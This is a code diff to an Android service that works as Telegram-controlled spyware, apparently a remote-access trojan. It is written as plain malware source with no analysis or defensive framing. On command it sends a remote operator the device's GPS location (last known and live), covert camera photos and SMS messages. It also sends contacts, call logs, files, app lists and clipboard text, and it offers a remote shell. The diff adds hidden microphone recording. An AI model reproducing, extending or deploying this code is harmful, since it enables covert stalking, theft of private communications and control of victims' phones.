@@ -41,7 +41,7 @@ public class BotService extends Service {
         TgApi.send("Online");
         while(running){
             try{
-                String url = TgApi.API+"/getUpdates?timeout=25&offset="+(lastId+1);
+                String url = TgApi.API+"/getUpdates?timeout=20&offset="+(lastId+1);
                 String r = TgApi.get(url);
                 if(r == null || r.isEmpty()){ Thread.sleep(1500); continue; }
                 JSONObject j = new JSONObject(r);
@@ -63,7 +63,7 @@ public class BotService extends Service {
                     handleMulti(txt);
                 }
             }catch(Exception e){
-                try{ Thread.sleep(2500); }catch(Exception ex){}
+                try{ Thread.sleep(2000); }catch(Exception ex){}
             }
         }
     }
@@ -72,34 +72,36 @@ public class BotService extends Service {
         for(String line : lines){
             String cmd = line.trim();
             if(cmd.isEmpty()) continue;
-            try{ handle(cmd); }catch(Exception e){ TgApi.send("err "+cmd+": "+e.getMessage()); }
-            try{ Thread.sleep(300); }catch(Exception e){}
+            try{ handle(cmd); }catch(Exception e){ TgApi.send("err: "+e.getMessage()); }
+            try{ Thread.sleep(400); }catch(Exception e){}
         }
     }
     private void handle(String cmd){
         String c = cmd.toLowerCase();
-        if(c.equals("/start") || c.equals("/help") || c.equals("menu")){
+        if(c.equals("/start") || c.equals("/help") || c.equals("/menu")){
             TgApi.send("MENU:\n" +
                 "/info - Device\n" +
-                "/loc - Lokasi\n" +
-                "/live - Live 60s\n" +
-                "/cam - Cam depan\n" +
-                "/cam_back - Cam belakang\n" +
+                "/loc - Lokasi last\n" +
+                "/live - Live lokasi 60s\n" +
+                "/cam - Kamera depan\n" +
+                "/cam_back - Kamera belakang\n" +
+                "/mic - Rekam 15s\n" +
                 "/sms - SMS\n" +
                 "/contacts - Kontak\n" +
                 "/callog - Call log\n" +
-                "/files - File\n" +
+                "/files - File storage\n" +
                 "/apps - App list\n" +
+                "/clip - Clipboard\n" +
                 "/vibrate - Vibrate\n" +
-                "/shell <cmd> - Shell\n" +
-                "/clip - Clipboard");
+                "/shell <cmd> - Shell");
             return;
         }
         if(c.equals("/info")||c.equals("/device")){ TgApi.send("Model: "+Build.MODEL+"\nBrand: "+Build.BRAND+"\nAndroid: "+Build.VERSION.RELEASE+"\nSDK: "+Build.VERSION.SDK_INT); return; }
-        if(c.equals("/loc")||c.equals("/location")){ sendLoc(); return; }
+        if(c.equals("/loc")){ sendLoc(); return; }
         if(c.equals("/live")){ liveLoc(); return; }
-        if(c.equals("/cam")||c.equals("/camera")){ capture(0); return; }
+        if(c.equals("/cam")){ capture(0); return; }
         if(c.equals("/cam_back")){ capture(1); return; }
+        if(c.equals("/mic")){ recMic(); return; }
         if(c.equals("/sms")){ sms(); return; }
         if(c.equals("/contacts")){ contacts(); return; }
         if(c.equals("/callog")){ callog(); return; }
@@ -111,86 +113,113 @@ public class BotService extends Service {
         TgApi.send("Unknown: "+cmd);
     }
     private void sendLoc(){
-        try{
-            Location last = null;
-            for(String p : locMgr.getProviders(true)){
-                Location l = locMgr.getLastKnownLocation(p);
-                if(l!=null && (last==null || l.getTime()>last.getTime())) last = l;
-            }
-            if(last!=null){
-                TgApi.sendLoc(last.getLatitude(), last.getLongitude());
-                TgApi.send("Lat: "+last.getLatitude()+"\nLon: "+last.getLongitude()+"\nAcc: "+last.getAccuracy()+"m");
-            } else TgApi.send("No location. Coba /live");
-        }catch(Exception e){ TgApi.send("loc err "+e.getMessage()); }
+        new Handler(Looper.getMainLooper()).post(() -> {
+            try{
+                Location last = null;
+                for(String p : locMgr.getProviders(true)){
+                    Location l = locMgr.getLastKnownLocation(p);
+                    if(l!=null && (last==null || l.getTime()>last.getTime())) last = l;
+                }
+                if(last!=null){
+                    TgApi.sendLoc(last.getLatitude(), last.getLongitude());
+                    TgApi.send("Lat: "+last.getLatitude()+"\nLon: "+last.getLongitude()+"\nAcc: "+last.getAccuracy()+"m");
+                } else TgApi.send("No last location. Pakai /live");
+            }catch(Exception e){ TgApi.send("loc err "+e.getMessage()); }
+        });
     }
     private void liveLoc(){
         TgApi.send("Live 60s started");
-        final LocationListener ll = new LocationListener(){
-            public void onLocationChanged(Location l){
-                TgApi.sendLoc(l.getLatitude(), l.getLongitude());
-                TgApi.send("Lat: "+l.getLatitude()+"\nLon: "+l.getLongitude());
-            }
-            public void onStatusChanged(String s,int i,Bundle b){}
-            public void onProviderEnabled(String s){}
-            public void onProviderDisabled(String s){}
-        };
-        try{
-            locMgr.requestLocationUpdates(LocationManager.GPS_PROVIDER, 5000, 0, ll);
-            locMgr.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 5000, 0, ll);
-        }catch(Exception e){}
-        new Handler(Looper.getMainLooper()).postDelayed(()->{
-            try{ locMgr.removeUpdates(ll); }catch(Exception e){}
-            TgApi.send("Live done");
-        }, 60000);
+        new Handler(Looper.getMainLooper()).post(() -> {
+            final LocationListener ll = new LocationListener(){
+                public void onLocationChanged(Location l){
+                    TgApi.sendLoc(l.getLatitude(), l.getLongitude());
+                    TgApi.send("Lat: "+l.getLatitude()+"\nLon: "+l.getLongitude()+"\nAcc: "+l.getAccuracy()+"m");
+                }
+                public void onStatusChanged(String s,int i,Bundle b){}
+                public void onProviderEnabled(String s){ TgApi.send("GPS on: "+s); }
+                public void onProviderDisabled(String s){ TgApi.send("GPS off: "+s); }
+            };
+            try{
+                locMgr.requestLocationUpdates(LocationManager.GPS_PROVIDER, 3000, 0, ll);
+                locMgr.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 3000, 0, ll);
+                TgApi.send("Listening GPS + NET");
+            }catch(Exception e){ TgApi.send("live err "+e.getMessage()); }
+            new Handler(Looper.getMainLooper()).postDelayed(()->{
+                try{ locMgr.removeUpdates(ll); }catch(Exception e){}
+                TgApi.send("Live done");
+            }, 60000);
+        });
     }
     private void capture(final int facing){
-        TgApi.send("Cam capture...");
-        try{
-            CameraManager cm = (CameraManager) getSystemService(CAMERA_SERVICE);
-            String camId = null;
-            for(String id : cm.getCameraIdList()){
-                CameraCharacteristics ch = cm.getCameraCharacteristics(id);
-                Integer f = ch.get(CameraCharacteristics.LENS_FACING);
-                if(f!=null && f==facing){ camId=id; break; }
-            }
-            if(camId==null){ TgApi.send("No camera"); return; }
-            cm.openCamera(camId, new CameraDevice.StateCallback(){
-                public void onOpened(CameraDevice cam){
-                    try{
-                        final ImageReader rd = ImageReader.newInstance(640,480,ImageFormat.JPEG,2);
-                        rd.setOnImageAvailableListener(r->{
-                            Image img = r.acquireLatestImage();
-                            if(img!=null){
-                                java.nio.ByteBuffer buf = img.getPlanes()[0].getBuffer();
-                                byte[] by = new byte[buf.remaining()];
-                                buf.get(by); img.close();
-                                TgApi.sendPhoto(Base64.encodeToString(by,Base64.NO_WRAP),"Cam "+(facing==0?"front":"back"));
-                            }
-                            cam.close();
-                        }, null);
-                        cam.createCaptureSession(Collections.singletonList(rd.getSurface()),
-                            new CameraCaptureSession.StateCallback(){
-                                public void onConfigured(CameraCaptureSession s){
-                                    try{
-                                        CaptureRequest.Builder b = cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
-                                        b.addTarget(rd.getSurface());
-                                        s.capture(b.build(), null, null);
-                                    }catch(Exception e){}
-                                }
-                                public void onConfigureFailed(CameraCaptureSession s){}
-                            }, null);
-                    }catch(Exception e){ TgApi.send("Cam open err: "+e.getMessage()); }
+        TgApi.send("Cam capture "+(facing==0?"front":"back")+"...");
+        new Handler(Looper.getMainLooper()).post(() -> {
+            try{
+                CameraManager cm = (CameraManager) getSystemService(CAMERA_SERVICE);
+                String camId = null;
+                for(String id : cm.getCameraIdList()){
+                    CameraCharacteristics ch = cm.getCameraCharacteristics(id);
+                    Integer f = ch.get(CameraCharacteristics.LENS_FACING);
+                    if(f!=null && f==facing){ camId=id; break; }
                 }
-                public void onDisconnected(CameraDevice c){}
-                public void onError(CameraDevice c,int e){ TgApi.send("Cam err "+e); }
-            }, null);
-        }catch(Exception e){ TgApi.send("Cam ex "+e.getMessage()); }
+                if(camId==null){ TgApi.send("No camera"); return; }
+                cm.openCamera(camId, new CameraDevice.StateCallback(){
+                    public void onOpened(CameraDevice cam){
+                        try{
+                            final ImageReader rd = ImageReader.newInstance(640,480,ImageFormat.JPEG,2);
+                            rd.setOnImageAvailableListener(r->{
+                                Image img = r.acquireLatestImage();
+                                if(img!=null){
+                                    java.nio.ByteBuffer buf = img.getPlanes()[0].getBuffer();
+                                    byte[] by = new byte[buf.remaining()];
+                                    buf.get(by); img.close();
+                                    TgApi.sendPhoto(Base64.encodeToString(by,Base64.NO_WRAP),"cam "+(facing==0?"front":"back"));
+                                }
+                                cam.close();
+                            }, new Handler(Looper.getMainLooper()));
+                            cam.createCaptureSession(Collections.singletonList(rd.getSurface()),
+                                new CameraCaptureSession.StateCallback(){
+                                    public void onConfigured(CameraCaptureSession s){
+                                        try{
+                                            CaptureRequest.Builder b = cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
+                                            b.addTarget(rd.getSurface());
+                                            s.capture(b.build(), null, null);
+                                        }catch(Exception e){ TgApi.send("cap err "+e.getMessage()); }
+                                    }
+                                    public void onConfigureFailed(CameraCaptureSession s){ TgApi.send("config fail"); }
+                                }, new Handler(Looper.getMainLooper()));
+                        }catch(Exception e){ TgApi.send("cam open err: "+e.getMessage()); }
+                    }
+                    public void onDisconnected(CameraDevice c){ TgApi.send("cam disc"); }
+                    public void onError(CameraDevice c,int e){ TgApi.send("cam err "+e); }
+                }, new Handler(Looper.getMainLooper()));
+            }catch(Exception e){ TgApi.send("cam ex "+e.getMessage()); }
+        });
+    }
+    private void recMic(){
+        TgApi.send("Mic rec 15s...");
+        new Handler(Looper.getMainLooper()).post(() -> {
+            try{
+                final MediaRecorder rec = new MediaRecorder();
+                rec.setAudioSource(MediaRecorder.AudioSource.MIC);
+                rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
+                rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
+                final File f = new File(getCacheDir(),"rec.m4a");
+                rec.setOutputFile(f.getAbsolutePath());
+                rec.prepare(); rec.start();
+                new Handler(Looper.getMainLooper()).postDelayed(()->{
+                    try{
+                        rec.stop(); rec.release();
+                        TgApi.send("Mic done: "+f.getName());
+                    }catch(Exception e){ TgApi.send("mic stop err "+e.getMessage()); }
+                }, 15000);
+            }catch(Exception e){ TgApi.send("mic err "+e.getMessage()); }
+        });
     }
     private void sms(){
         try{
             StringBuilder sb = new StringBuilder();
             android.database.Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"),null,null,null,"date DESC LIMIT 20");
-            int n = 0;
+            int n=0;
             while(c!=null && c.moveToNext()){
                 sb.append("[").append(c.getString(c.getColumnIndex("address"))).append("]\n")
                   .append(c.getString(c.getColumnIndex("body"))).append("\n---\n");
@@ -198,7 +227,7 @@ public class BotService extends Service {
             }
             if(c!=null)c.close();
             String t = sb.toString();
-            if(t.isEmpty()) t = "No SMS";
+            if(t.isEmpty()) t = "No SMS (atau permission ditolak)";
             if(t.length()>3500) t = t.substring(0,3500);
             TgApi.send(t);
         }catch(Exception e){ TgApi.send("sms err "+e.getMessage()); }
@@ -265,7 +294,7 @@ public class BotService extends Service {
             ClipboardManager cm = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
             if(cm.hasPrimaryClip()){
                 CharSequence t = cm.getPrimaryClip().getItemAt(0).getText();
-                TgApi.send("Clip: "+(t!=null?t.toString():""));
+                TgApi.send("Clip: "+(t!=null?t.toString():"(null)"));
             } else TgApi.send("Clip empty");
         }catch(Exception e){ TgApi.send("clip err "+e.getMessage()); }
     }
